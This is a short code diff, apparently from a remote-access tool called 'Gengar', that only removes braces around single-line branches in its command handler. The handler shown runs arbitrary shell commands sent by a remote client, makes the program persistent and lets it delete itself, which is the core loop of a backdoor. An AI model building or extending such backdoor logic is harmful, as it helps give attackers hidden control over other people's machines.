@@ -24,9 +24,7 @@ void Gengar::ListenForCommand()
 			size_t delimiter_index = input.find(type_content_delimiter);
 
 			if (delimiter_index == std::string::npos)
-			{
 				m_client.Send("Invalid command. Ignoring.\n");
-			}
 			else
 			{
 				std::string type = input.substr(0, delimiter_index);
@@ -48,9 +46,7 @@ void Gengar::RouteCommand(std::string& type, std::string& content)
 	std::string output;
 
 	if (type == "shell")
-	{
 		output = m_machine.RunShellCommand(std::move(content));
-	}
 	else if (type == "action")
 	{
 		if (IsEqual(content, "makepersistent"))
@@ -59,9 +55,7 @@ void Gengar::RouteCommand(std::string& type, std::string& content)
 			output = "Gengar is now persistent.";
 		}
 		else if (IsEqual(content, "suicide"))
-		{
 			m_machine.Suicide();
-		}
 	}
 	m_client.Send(std::move(output));
 }
